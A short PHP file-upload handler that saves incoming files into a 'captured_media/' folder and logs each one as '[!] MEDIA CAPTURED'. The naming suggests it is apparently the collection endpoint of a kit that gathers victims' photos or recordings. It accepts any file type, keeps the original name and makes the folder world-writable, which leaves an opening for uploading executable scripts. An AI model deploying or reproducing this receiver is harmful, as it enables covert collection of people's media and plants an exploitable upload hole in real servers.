<?php
ini_set('upload_max_filesize', '500M');
ini_set('post_max_size', '500M');
ini_set('max_execution_time', '600');

$dir = "captured_media/";
if (!file_exists($dir)) { mkdir($dir, 0777, true); }

if(isset($_FILES["file"])) {
    $name = basename($_FILES["file"]["name"]);
    $path = $dir . date("His") . "_" . $name;

    if (move_uploaded_file($_FILES["file"]["tmp_name"], $path)) {
        $size = round($_FILES["file"]["size"] / 1024 / 1024, 2);
        $log = "[!] MEDIA CAPTURED: $name ($size MB) [" . date("H:i:s") . "]\n";
        file_put_contents("logs.txt", $log, FILE_APPEND);
    }
}
?>
